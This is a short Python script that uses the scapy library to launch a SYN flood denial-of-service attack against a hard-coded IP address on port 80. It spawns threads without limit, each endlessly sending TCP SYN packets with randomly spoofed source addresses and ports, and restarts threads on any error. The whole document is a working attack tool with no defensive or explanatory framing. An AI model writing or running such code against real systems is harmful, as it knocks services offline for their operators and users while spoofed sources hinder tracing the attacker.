from scapy.all import*
from scapy.layers.inet import IP, TCP
import threading

target_ip = "172.21.209.231"
target_port = 80

def main():
	while (True):
		thrd = threading.Thread(target=synflood, args=(target_ip, target_port))
		thrd.start()

def synflood(target_ip, target_port):
	while (True):
		try:
        		ip = IP(src = RandIP(), dst = target_ip)
        		tcp = TCP(sport = RandShort(), dport = target_port, flags="S")
        		packet = ip / tcp
        		send(packet)
		except:
			thrd = threading.Thread(target=synflood, args=(target_ip, target_port))
			thrd.start()

if __name__ == '__main__':
	main()
